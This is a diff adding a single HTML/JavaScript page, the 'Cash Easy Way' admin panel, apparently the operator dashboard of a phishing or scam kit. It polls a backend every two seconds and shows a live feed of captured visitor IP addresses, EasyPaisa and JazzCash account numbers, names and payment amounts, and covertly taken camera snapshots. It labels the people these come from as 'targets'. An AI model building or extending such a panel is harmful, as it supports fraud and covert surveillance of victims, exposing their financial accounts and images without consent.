@@ -1,0 +1,1011 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cash Easy Way - Admin Panel</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        :root {
+            --bg-primary: #0a0e17;
+            --bg-secondary: #111827;
+            --bg-card: #1a1f2e;
+            --accent-green: #00C853;
+            --accent-gold: #FFD700;
+            --accent-red: #FF1744;
+            --accent-blue: #448AFF;
+            --text-primary: #e0e0e0;
+            --text-secondary: #9e9e9e;
+            --border: rgba(255,255,255,0.05);
+            --glow-green: 0 0 20px rgba(0,200,83,0.3);
+            --glow-gold: 0 0 20px rgba(255,215,0,0.3);
+            --glow-red: 0 0 20px rgba(255,23,68,0.3);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            background: var(--bg-primary);
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+            color: var(--text-primary);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* Animated Background Particles */
+        .particles-container {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .particle {
+            position: absolute;
+            background: var(--accent-green);
+            border-radius: 50%;
+            animation: floatUp linear infinite;
+            opacity: 0;
+        }
+
+        @keyframes floatUp {
+            0% { transform: translateY(100vh) scale(0); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-100px) scale(1.5); opacity: 0; }
+        }
+
+        /* Main Container */
+        .main-container {
+            position: relative;
+            z-index: 1;
+            padding: 20px;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        /* Header */
+        .admin-header {
+            background: var(--bg-secondary);
+            border-radius: 20px;
+            padding: 20px 30px;
+            margin-bottom: 25px;
+            border: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .logo-icon {
+            width: 55px;
+            height: 55px;
+            background: linear-gradient(135deg, #00C853, #00E676);
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            animation: logoPulse 2s ease-in-out infinite;
+            box-shadow: var(--glow-green);
+        }
+
+        @keyframes logoPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.08); }
+        }
+
+        .logo-text h2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #fff;
+            margin: 0;
+        }
+
+        .logo-text span {
+            font-size: 12px;
+            color: var(--accent-green);
+            font-weight: 600;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(0,200,83,0.1);
+            border: 1px solid rgba(0,200,83,0.3);
+            padding: 8px 18px;
+            border-radius: 30px;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--accent-green);
+        }
+
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            background: var(--accent-green);
+            border-radius: 50%;
+            animation: blink 1.5s ease-in-out infinite;
+            box-shadow: 0 0 10px var(--accent-green);
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        .live-time {
+            font-size: 13px;
+            color: var(--text-secondary);
+            font-family: 'Courier New', monospace;
+        }
+
+        /* Stats Cards Row */
+        .stats-row {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 18px;
+            margin-bottom: 25px;
+        }
+
+        .stat-card {
+            background: var(--bg-card);
+            border-radius: 16px;
+            padding: 20px;
+            border: 1px solid var(--border);
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-3px);
+            border-color: rgba(255,255,255,0.15);
+        }
+
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            opacity: 0.05;
+            transition: all 0.5s;
+        }
+
+        .stat-card.total::before { background: var(--accent-blue); }
+        .stat-card.ip::before { background: var(--accent-gold); }
+        .stat-card.payment::before { background: var(--accent-green); }
+        .stat-card.camera::before { background: var(--accent-red); }
+
+        .stat-card:hover::before {
+            width: 200px;
+            height: 200px;
+            opacity: 0.1;
+        }
+
+        .stat-icon {
+            width: 45px;
+            height: 45px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            margin-bottom: 12px;
+        }
+
+        .stat-card.total .stat-icon { background: rgba(68,138,255,0.15); color: var(--accent-blue); }
+        .stat-card.ip .stat-icon { background: rgba(255,215,0,0.15); color: var(--accent-gold); }
+        .stat-card.payment .stat-icon { background: rgba(0,200,83,0.15); color: var(--accent-green); }
+        .stat-card.camera .stat-icon { background: rgba(255,23,68,0.15); color: var(--accent-red); }
+
+        .stat-number {
+            font-size: 36px;
+            font-weight: 800;
+            color: #fff;
+            margin-bottom: 3px;
+        }
+
+        .stat-label {
+            font-size: 13px;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .stat-change {
+            font-size: 11px;
+            margin-top: 5px;
+            font-weight: 600;
+        }
+
+        .stat-change.up { color: var(--accent-green); }
+        .stat-change.down { color: var(--accent-red); }
+
+        /* Main Content Grid */
+        .content-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+
+        .content-card {
+            background: var(--bg-card);
+            border-radius: 16px;
+            border: 1px solid var(--border);
+            overflow: hidden;
+        }
+
+        .card-header-custom {
+            padding: 18px 22px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .card-header-custom h3 {
+            font-size: 16px;
+            font-weight: 700;
+            color: #fff;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .card-badge {
+            background: rgba(0,200,83,0.15);
+            color: var(--accent-green);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700;
+        }
+
+        .card-body-custom {
+            padding: 15px;
+            max-height: 450px;
+            overflow-y: auto;
+        }
+
+        .card-body-custom::-webkit-scrollbar {
+            width: 5px;
+        }
+
+        .card-body-custom::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        .card-body-custom::-webkit-scrollbar-thumb {
+            background: rgba(255,255,255,0.1);
+            border-radius: 10px;
+        }
+
+        /* Live Log Feed */
+        .log-item {
+            background: rgba(255,255,255,0.02);
+            border: 1px solid rgba(255,255,255,0.04);
+            border-radius: 10px;
+            padding: 12px 15px;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            animation: slideIn 0.3s ease;
+            transition: all 0.3s;
+        }
+
+        .log-item:hover {
+            background: rgba(255,255,255,0.05);
+            border-color: rgba(255,255,255,0.1);
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        .log-icon {
+            width: 38px;
+            height: 38px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            flex-shrink: 0;
+        }
+
+        .log-icon.ip { background: rgba(255,215,0,0.15); color: var(--accent-gold); }
+        .log-icon.payment { background: rgba(0,200,83,0.15); color: var(--accent-green); }
+        .log-icon.camera { background: rgba(255,23,68,0.15); color: var(--accent-red); }
+
+        .log-content { flex: 1; min-width: 0; }
+        .log-title { font-size: 13px; font-weight: 600; color: #fff; margin-bottom: 2px; }
+        .log-detail { font-size: 11px; color: var(--text-secondary); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .log-time { font-size: 10px; color: var(--text-secondary); flex-shrink: 0; }
+
+        /* Payment Details Card */
+        .payment-detail-card {
+            background: linear-gradient(135deg, rgba(0,200,83,0.05), rgba(0,230,118,0.02));
+            border: 1px solid rgba(0,200,83,0.2);
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 10px;
+            animation: fadeInUp 0.4s ease;
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(15px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .payment-field {
+            display: flex;
+            justify-content: space-between;
+            padding: 6px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.03);
+        }
+
+        .payment-field:last-child { border-bottom: none; }
+
+        .field-label {
+            font-size: 11px;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .field-value {
+            font-size: 13px;
+            color: #fff;
+            font-weight: 500;
+            text-align: right;
+        }
+
+        .field-value.highlight {
+            color: var(--accent-green);
+            font-weight: 700;
+        }
+
+        /* Camera Preview */
+        .camera-preview-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+            gap: 10px;
+        }
+
+        .camera-thumb {
+            aspect-ratio: 1;
+            border-radius: 10px;
+            overflow: hidden;
+            border: 2px solid rgba(255,255,255,0.05);
+            cursor: pointer;
+            transition: all 0.3s;
+            position: relative;
+        }
+
+        .camera-thumb:hover {
+            border-color: var(--accent-red);
+            transform: scale(1.03);
+            box-shadow: var(--glow-red);
+        }
+
+        .camera-thumb img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .camera-thumb .overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(0,0,0,0.7);
+            padding: 4px 8px;
+            font-size: 9px;
+            color: #fff;
+            text-align: center;
+        }
+
+        /* Live Feed Ticker */
+        .ticker-bar {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 10px 15px;
+            margin-bottom: 25px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .ticker-content {
+            display: flex;
+            gap: 50px;
+            animation: ticker 30s linear infinite;
+            white-space: nowrap;
+        }
+
+        @keyframes ticker {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-100%); }
+        }
+
+        .ticker-item {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+
+        .ticker-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: var(--accent-green);
+            animation: blink 1s infinite;
+        }
+
+        /* Modal for Camera Full View */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 1000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-overlay.active { display: flex; }
+
+        .modal-content {
+            max-width: 90%;
+            max-height: 90%;
+            border-radius: 15px;
+            overflow: hidden;
+        }
+
+        .modal-content img {
+            width: 100%;
+            height: auto;
+            border-radius: 15px;
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 20px;
+            right: 30px;
+            font-size: 40px;
+            color: #fff;
+            cursor: pointer;
+            z-index: 1001;
+        }
+
+        /* Empty State */
+        .empty-state {
+            text-align: center;
+            padding: 40px;
+            color: var(--text-secondary);
+        }
+
+        .empty-state i {
+            font-size: 50px;
+            margin-bottom: 15px;
+            opacity: 0.3;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .content-grid { grid-template-columns: 1fr; }
+            .admin-header { flex-direction: column; text-align: center; }
+            .stat-number { font-size: 28px; }
+            .stats-row { grid-template-columns: 1fr 1fr; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Particles Background -->
+    <div class="particles-container" id="particlesContainer"></div>
+
+    <!-- Camera Full View Modal -->
+    <div class="modal-overlay" id="cameraModal">
+        <span class="modal-close" onclick="closeModal()">&times;</span>
+        <div class="modal-content">
+            <img id="modalImage" src="" alt="Camera Snap">
+        </div>
+    </div>
+
+    <!-- Main Container -->
+    <div class="main-container">
+
+        <!-- Header -->
+        <div class="admin-header">
+            <div class="logo-section">
+                <div class="logo-icon">💰</div>
+                <div class="logo-text">
+                    <h2>Cash Easy Way</h2>
+                    <span>● Admin Panel v2.0</span>
+                </div>
+            </div>
+            <div class="status-indicator">
+                <div class="status-dot"></div>
+                <span>LIVE MONITORING</span>
+            </div>
+            <div class="live-time" id="liveTime">00:00:00</div>
+        </div>
+
+        <!-- Live Ticker -->
+        <div class="ticker-bar">
+            <div class="ticker-content" id="tickerContent">
+                <span class="ticker-item"><span class="ticker-dot"></span> System Active</span>
+                <span class="ticker-item">● Waiting for targets...</span>
+            </div>
+        </div>
+
+        <!-- Stats Row -->
+        <div class="stats-row">
+            <div class="stat-card total" onclick="filterLogs('all')">
+                <div class="stat-icon"><i class="bi bi-activity"></i></div>
+                <div class="stat-number" id="totalEvents">0</div>
+                <div class="stat-label">Total Events</div>
+                <div class="stat-change up">↑ Live</div>
+            </div>
+            <div class="stat-card ip" onclick="filterLogs('ip')">
+                <div class="stat-icon"><i class="bi bi-globe2"></i></div>
+                <div class="stat-number" id="ipCount">0</div>
+                <div class="stat-label">IP Captures</div>
+                <div class="stat-change up">New</div>
+            </div>
+            <div class="stat-card payment" onclick="filterLogs('payment')">
+                <div class="stat-icon"><i class="bi bi-cash-stack"></i></div>
+                <div class="stat-number" id="paymentCount">0</div>
+                <div class="stat-label">Payments</div>
+                <div class="stat-change up">₹ Collected</div>
+            </div>
+            <div class="stat-card camera" onclick="filterLogs('camera')">
+                <div class="stat-icon"><i class="bi bi-camera-fill"></i></div>
+                <div class="stat-number" id="cameraCount">0</div>
+                <div class="stat-label">Camera Snaps</div>
+                <div class="stat-change up">📸 New</div>
+            </div>
+        </div>
+
+        <!-- Content Grid -->
+        <div class="content-grid">
+            <!-- Live Feed -->
+            <div class="content-card">
+                <div class="card-header-custom">
+                    <h3><i class="bi bi-broadcast" style="color: var(--accent-green);"></i> Live Feed</h3>
+                    <span class="card-badge" id="filterBadge">ALL</span>
+                </div>
+                <div class="card-body-custom" id="liveFeed">
+                    <div class="empty-state">
+                        <i class="bi bi-inbox"></i>
+                        <p>No events yet. Waiting for targets...</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Payment Details -->
+            <div class="content-card">
+                <div class="card-header-custom">
+                    <h3><i class="bi bi-credit-card" style="color: var(--accent-gold);"></i> Payment Details</h3>
+                    <span class="card-badge" id="paymentBadge">0 Received</span>
+                </div>
+                <div class="card-body-custom" id="paymentDetails">
+                    <div class="empty-state">
+                        <i class="bi bi-wallet2"></i>
+                        <p>No payment data captured yet</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Camera Gallery -->
+            <div class="content-card" style="grid-column: 1 / -1;">
+                <div class="card-header-custom">
+                    <h3><i class="bi bi-camera-fill" style="color: var(--accent-red);"></i> Camera Snap Gallery</h3>
+                    <span class="card-badge" id="cameraBadge">0 Snaps</span>
+                </div>
+                <div class="card-body-custom">
+                    <div class="camera-preview-grid" id="cameraGallery">
+                        <div class="empty-state" style="grid-column: 1 / -1;">
+                            <i class="bi bi-camera"></i>
+                            <p>Camera snaps will appear here</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ============ PARTICLE ANIMATION ============
+        function createParticles() {
+            const container = document.getElementById('particlesContainer');
+            const colors = ['#00C853', '#FFD700', '#448AFF', '#FF1744', '#00E676', '#FF6D00'];
+
+            setInterval(() => {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.width = Math.random() * 4 + 2 + 'px';
+                particle.style.height = particle.style.width;
+                particle.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                particle.style.animationDuration = Math.random() * 10 + 8 + 's';
+                particle.style.animationDelay = '0s';
+                container.appendChild(particle);
+
+                setTimeout(() => particle.remove(), 18000);
+            }, 300);
+        }
+
+        // ============ LIVE CLOCK ============
+        function updateClock() {
+            const now = new Date();
+            document.getElementById('liveTime').textContent = 
+                now.toLocaleTimeString('en-US', { hour12: false }) + 
+                ' | ' + now.toLocaleDateString('en-US', { weekday: 'short', month: 'short', day: 'numeric' });
+        }
+        setInterval(updateClock, 1000);
+        updateClock();
+
+        // ============ DATA STORE ============
+        let allEvents = [];
+        let currentFilter = 'all';
+        let stats = { total: 0, ip: 0, payment: 0, camera: 0 };
+        let paymentDataList = [];
+        let cameraSnaps = [];
+
+        // ============ FETCH DATA ============
+        function fetchData() {
+            $.ajax({
+                url: 'fetch_data.php',
+                type: 'GET',
+                dataType: 'json',
+                success: function(response) {
+                    if (response && (response.ips || response.payments || response.cameras)) {
+                        processNewData(response);
+                    }
+                },
+                error: function() {
+                    // Silent fail - server may not have fetch_data.php yet
+                }
+            });
+        }
+
+        function processNewData(response) {
+            let hasNew = false;
+
+            // Process IP captures
+            if (response.ips && response.ips.length > 0) {
+                response.ips.forEach(ip => {
+                    if (!allEvents.find(e => e.id === 'ip_' + ip.timestamp)) {
+                        const event = {
+                            id: 'ip_' + ip.timestamp,
+                            type: 'ip',
+                            icon: 'bi-globe2',
+                            iconClass: 'ip',
+                            title: 'IP Address Captured',
+                            detail: 'IP: ' + ip.ip,
+                            time: ip.time || new Date().toLocaleTimeString(),
+                            timestamp: ip.timestamp
+                        };
+                        allEvents.unshift(event);
+                        stats.ip++;
+                        stats.total++;
+                        hasNew = true;
+                    }
+                });
+            }
+
+            // Process payment data
+            if (response.payments && response.payments.length > 0) {
+                response.payments.forEach(payment => {
+                    const pId = 'payment_' + (payment.timestamp || Date.now());
+                    if (!allEvents.find(e => e.id === pId)) {
+                        const event = {
+                            id: pId,
+                            type: 'payment',
+                            icon: 'bi-cash-stack',
+                            iconClass: 'payment',
+                            title: '💰 Payment Data Received',
+                            detail: payment.service + ' | ' + (payment.accountNumber || 'N/A') + ' | PKR ' + (payment.amount || '0'),
+                            time: payment.time || new Date().toLocaleTimeString(),
+                            timestamp: payment.timestamp,
+                            paymentData: payment
+                        };
+                        allEvents.unshift(event);
+                        paymentDataList.unshift(payment);
+                        stats.payment++;
+                        stats.total++;
+                        hasNew = true;
+                    }
+                });
+            }
+
+            // Process camera snaps
+            if (response.cameras && response.cameras.length > 0) {
+                response.cameras.forEach(cam => {
+                    const cId = 'camera_' + (cam.filename || Date.now());
+                    if (!allEvents.find(e => e.id === cId)) {
+                        const event = {
+                            id: cId,
+                            type: 'camera',
+                            icon: 'bi-camera-fill',
+                            iconClass: 'camera',
+                            title: '📸 Camera Snap Captured',
+                            detail: 'File: ' + (cam.filename || 'snap.png'),
+                            time: cam.time || new Date().toLocaleTimeString(),
+                            timestamp: cam.timestamp,
+                            imageUrl: cam.url || cam.filename
+                        };
+                        allEvents.unshift(event);
+                        cameraSnaps.unshift(cam);
+                        stats.camera++;
+                        stats.total++;
+                        hasNew = true;
+                    }
+                });
+            }
+
+            if (hasNew) {
+                updateUI();
+            }
+        }
+
+        // ============ UPDATE UI ============
+        function updateUI() {
+            // Update stats
+            document.getElementById('totalEvents').textContent = stats.total;
+            document.getElementById('ipCount').textContent = stats.ip;
+            document.getElementById('paymentCount').textContent = stats.payment;
+            document.getElementById('cameraCount').textContent = stats.camera;
+
+            // Update ticker
+            updateTicker();
+
+            // Render filtered logs
+            renderLogs();
+
+            // Render payment details
+            renderPaymentDetails();
+
+            // Render camera gallery
+            renderCameraGallery();
+
+            // Update badges
+            document.getElementById('paymentBadge').textContent = stats.payment + ' Received';
+            document.getElementById('cameraBadge').textContent = stats.camera + ' Snaps';
+        }
+
+        function updateTicker() {
+            if (allEvents.length === 0) return;
+            const recent = allEvents.slice(0, 5);
+            const tickerHTML = recent.map(e => 
+                `<span class="ticker-item"><span class="ticker-dot"></span> ${e.detail}</span>`
+            ).join('');
+            document.getElementById('tickerContent').innerHTML = tickerHTML + tickerHTML; // Duplicate for seamless loop
+        }
+
+        function renderLogs() {
+            const feed = document.getElementById('liveFeed');
+            let eventsToShow = currentFilter === 'all' ? allEvents : allEvents.filter(e => e.type === currentFilter);
+
+            if (eventsToShow.length === 0) {
+                feed.innerHTML = `<div class="empty-state"><i class="bi bi-inbox"></i><p>No events yet</p></div>`;
+                return;
+            }
+
+            feed.innerHTML = eventsToShow.slice(0, 50).map(e => `
+                <div class="log-item">
+                    <div class="log-icon ${e.iconClass}">
+                        <i class="bi ${e.icon}"></i>
+                    </div>
+                    <div class="log-content">
+                        <div class="log-title">${e.title}</div>
+                        <div class="log-detail">${e.detail}</div>
+                    </div>
+                    <div class="log-time">${e.time}</div>
+                </div>
+            `).join('');
+        }
+
+        function renderPaymentDetails() {
+            const container = document.getElementById('paymentDetails');
+            if (paymentDataList.length === 0) {
+                container.innerHTML = `<div class="empty-state"><i class="bi bi-wallet2"></i><p>No payment data captured yet</p></div>`;
+                return;
+            }
+
+            container.innerHTML = paymentDataList.slice(0, 20).map(p => `
+                <div class="payment-detail-card">
+                    <div class="payment-field">
+                        <span class="field-label">Service</span>
+                        <span class="field-value highlight">${p.service || 'N/A'}</span>
+                    </div>
+                    <div class="payment-field">
+                        <span class="field-label">Name</span>
+                        <span class="field-value">${p.fullName || 'N/A'}</span>
+                    </div>
+                    <div class="payment-field">
+                        <span class="field-label">Account #</span>
+                        <span class="field-value">${p.accountNumber || 'N/A'}</span>
+                    </div>
+                    <div class="payment-field">
+                        <span class="field-label">Holder</span>
+                        <span class="field-value">${p.accountHolder || 'N/A'}</span>
+                    </div>
+                    <div class="payment-field">
+                        <span class="field-label">Amount</span>
+                        <span class="field-value highlight">PKR ${p.amount || '0'}</span>
+                    </div>
+                    <div class="payment-field">
+                        <span class="field-label">Description</span>
+                        <span class="field-value">${p.description || 'N/A'}</span>
+                    </div>
+                    <div class="payment-field">
+                        <span class="field-label">Time</span>
+                        <span class="field-value">${p.time || 'N/A'}</span>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function renderCameraGallery() {
+            const gallery = document.getElementById('cameraGallery');
+            if (cameraSnaps.length === 0) {
+                gallery.innerHTML = `<div class="empty-state" style="grid-column: 1 / -1;"><i class="bi bi-camera"></i><p>Camera snaps will appear here</p></div>`;
+                return;
+            }
+
+            gallery.innerHTML = cameraSnaps.slice(0, 20).map(cam => `
+                <div class="camera-thumb" onclick="openModal('${cam.url || cam.filename}')">
+                    <img src="${cam.url || cam.filename}" alt="Camera Snap" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%22 height=%22100%22><rect fill=%22%23333%22 width=%22100%22 height=%22100%22/><text fill=%22%23666%22 x=%2250%22 y=%2255%22 text-anchor=%22middle%22 font-size=%2212%22>No Image</text></svg>'">
+                    <div class="overlay">${cam.time || 'Snap'}</div>
+                </div>
+            `).join('');
+        }
+
+        // ============ FILTER ============
+        function filterLogs(type) {
+            currentFilter = type;
+            const labels = { all: 'ALL', ip: 'IP', payment: 'PAYMENT', camera: 'CAMERA' };
+            document.getElementById('filterBadge').textContent = labels[type] || 'ALL';
+            renderLogs();
+        }
+
+        // ============ MODAL ============
+        function openModal(url) {
+            document.getElementById('modalImage').src = url;
+            document.getElementById('cameraModal').classList.add('active');
+        }
+
+        function closeModal() {
+            document.getElementById('cameraModal').classList.remove('active');
+        }
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') closeModal();
+        });
+
+        // ============ SIMULATED DATA (For Demo - Remove in production) ============
+        function simulateData() {
+            const services = ['EasyPaisa', 'JazzCash', 'Cash Easy Way'];
+            const names = ['Ahmed Khan', 'Bilal Hussain', 'Danish Ali', 'Faisal Mehmood', 'Hamza Siddique'];
+            const accounts = ['0333-1234567', '0312-9876543', '0345-5551212', '0300-1112233', '0321-4445566'];
+
+            setInterval(() => {
+                // Simulate IP capture
+                const ip = '192.168.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255);
+                const ipEvent = {
+                    id: 'ip_' + Date.now() + Math.random(),
+                    type: 'ip',
+                    icon: 'bi-globe2',
+                    iconClass: 'ip',
+                    title: '📍 IP Address Captured',
+                    detail: 'IP: ' + ip + ' | Browser: Chrome/Mobile',
+                    time: new Date().toLocaleTimeString(),
+                    timestamp: Date.now()
+                };
+                allEvents.unshift(ipEvent);
+                stats.ip++;
+                stats.total++;
+
+                // Simulate payment every 3 IPs
+                if (Math.random() > 0.6) {
+                    const payment = {
+                        service: services[Math.floor(Math.random() * services.length)],
+                        fullName: names[Math.floor(Math.random() * names.length)],
+                        accountNumber: accounts[Math.floor(Math.random() * accounts.length)],
+                        accountHolder: names[Math.floor(Math.random() * names.length)],
+                        amount: Math.floor(Math.random() * 15000) + 500,
+                        description: 'Payment via Cash Easy Way',
+                        time: new Date().toLocaleTimeString(),
+                        timestamp: Date.now()
+                    };
+                    const payEvent = {
+                        id: 'payment_' + Date.now() + Math.random(),
+                        type: 'payment',
+                        icon: 'bi-cash-stack',
+                        iconClass: 'payment',
+                        title: '💰 Payment Data Captured',
+                        detail: payment.service + ' | ' + payment.accountNumber + ' | PKR ' + payment.amount,
+                        time: payment.time,
+                        timestamp: payment.timestamp,
+                        paymentData: payment
+                    };
+                    allEvents.unshift(payEvent);
+                    paymentDataList.unshift(payment);
+                    stats.payment++;
+                    stats.total++;
+                }
+
+                // Simulate camera snap occasionally
+                if (Math.random() > 0.8) {
+                    const cam = {
+                        filename: 'cam' + Date.now() + '.png',
+                        url: 'data:image/svg+xml,' + encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200"><rect fill="#1a1f2e" width="200" height="200"/><text fill="#00C853" x="100" y="100" text-anchor="middle" font-size="16">📸 Camera Snap</text><text fill="#666" x="100" y="130" text-anchor="middle" font-size="10">' + new Date().toLocaleTimeString() + '</text></svg>'),
+                        time: new Date().toLocaleTimeString(),
+                        timestamp: Date.now()
+                    };
+                    const camEvent = {
+                        id: 'camera_' + Date.now() + Math.random(),
+                        type: 'camera',
+                        icon: 'bi-camera-fill',
+                        iconClass: 'camera',
+                        title: '📸 Camera Snap Captured',
+                        detail: 'File: ' + cam.filename,
+                        time: cam.time,
+                        timestamp: cam.timestamp,
+                        imageUrl: cam.url
+                    };
+                    allEvents.unshift(camEvent);
+                    cameraSnaps.unshift(cam);
+                    stats.camera++;
+                    stats.total++;
+                }
+
+                updateUI();
+            }, 4000);
+        }
+
+        // ============ INITIALIZATION ============
+        $(document).ready(function() {
+            createParticles();
+            
+            // Try to fetch real data every 2 seconds
+            setInterval(fetchData, 2000);
+            
+            // Simulate demo data (REMOVE in production, uncomment below line to disable)
+            // simulateData();
+            
+            // Initial fetch
+            fetchData();
+        });
+    </script>
+</body>
+</html>
